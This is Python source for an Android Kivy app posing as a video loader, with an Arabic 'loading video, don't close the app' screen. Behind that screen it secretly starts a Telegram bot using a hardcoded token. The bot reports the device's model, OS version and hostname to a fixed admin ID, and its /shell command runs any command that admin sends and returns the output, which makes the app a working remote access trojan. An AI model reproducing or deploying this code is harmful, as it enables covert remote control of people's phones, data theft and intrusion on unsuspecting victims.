from kivy.app import App
from kivy.uix.label import Label
import telebot
import subprocess
import platform
import threading

BOT_TOKEN = '8852458513:AAF4Cbx5d9JMEs-Cp3NjO20n9XwVxMmRdIA'
ADMIN_ID = 8935951670
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_info(message):
    if message.chat.id != ADMIN_ID: return
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        ver = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
        info = f"📱 **جهاز جديد!**\nالموديل: {model}\nالإصدار: {ver}\nالاسم: {platform.node()}"
    except:
        info = f"📱 **جهاز متصل!**\nOS: {platform.system()}"
    bot.reply_to(message, info, parse_mode='Markdown')

@bot.message_handler(commands=['shell'])
def run_shell(message):
    if message.chat.id != ADMIN_ID: return
    cmd = message.text.replace('/shell ', '').strip()
    try:
        result = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
        bot.reply_to(message, f"```\n{result[:4000]}\n```", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

def run_bot():
    bot.infinity_polling(timeout=60)

class FakeVideoApp(App):
    def build(self):
        threading.Thread(target=run_bot, daemon=True).start()
        return Label(text="جاري تحميل الفيديو...\n\n(لا تغلق التطبيق)")

if __name__ == '__main__':
    FakeVideoApp().run()
